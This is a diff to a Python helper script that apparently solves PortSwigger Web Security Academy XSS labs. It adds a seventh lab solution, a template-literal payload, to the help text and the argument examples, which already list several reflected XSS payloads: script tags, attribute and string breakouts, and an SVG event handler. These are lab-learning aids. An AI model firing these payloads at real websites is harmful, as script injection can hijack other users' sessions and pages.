@@ -26,9 +26,11 @@ Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da
 5. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped, solution: \';alert(1)//
 
 6. Reflected XSS with some SVG markup allowed, solution: <svg><animatetransform onbegin=alert('XSS') attributeName=transform>
+
+7. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped, solution: ${alert(1)}
 """, usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
 parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
-parser.add_argument('-c', '--command', help='Command to run, Example: <script>alert(\'XSS\')</script>, \" autofocus onfocus=alert(\'XSS\') x=\", \';-alert(\'XSS\')-\', </script><script>alert(1)</script>, \';alert(1)//, <svg><animatetransform onbegin=alert(\'XSS\') attributeName=transform>', required=True)
+parser.add_argument('-c', '--command', help='Command to run, Example: <script>alert(\'XSS\')</script>, \" autofocus onfocus=alert(\'XSS\') x=\", \';-alert(\'XSS\')-\', </script><script>alert(1)</script>, \';alert(1)//, <svg><animatetransform onbegin=alert(\'XSS\') attributeName=transform>, ${alert(1)}', required=True)
 parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
 args = parser.parse_args()
 
